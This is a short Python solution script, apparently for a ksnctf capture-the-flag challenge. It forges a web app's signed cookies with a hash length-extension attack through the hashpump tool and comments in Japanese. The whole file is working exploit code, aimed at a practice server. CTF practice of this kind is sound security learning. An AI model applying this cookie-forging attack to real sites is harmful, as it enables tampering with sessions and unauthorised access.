import requests
from subprocess import Popen, PIPE

class Solve:
    def __init__(self):
        self.s = requests.Session()
        self.url = 'http://ctfq.sweetduet.info:10080/~q31/kangacha.php'
    
    def post_top(self):
        return self.s.post(
            self.url, 
            data = {'submit': 'Gacha'}
        )
    
    def make_cookie(self):
        self.post_top()
        # 'hashpump -s (既知ハッシュ) -d (既知初期文字列) -k (UNKNOWNの長さ) -a (追加文字列)'
        command = 'hashpump -s {} -d {} -k {} -a {}'.format(
            self.s.cookies['signature'],
            self.s.cookies['ship'],
            21, # ksnctfのflagは21文字が多めなので決め打ち
            ',10',
        )
        proc = Popen(command.strip().split(" "), stdout=PIPE)
        out = proc.communicate()
        new_signature, new_ship = out[0].decode('utf-8').strip().split('\n')

        # cookieを初期化する
        self.s.cookies.clear()
        self.s.cookies['ship'] = new_ship.replace("\\x","%")
        self.s.cookies['signature'] = new_signature
    
    def get_flag(self):
        self.make_cookie()
        res = self.post_top()
        return res.text

if __name__ =='__main__':
    solve = Solve()
    print(solve.get_flag())
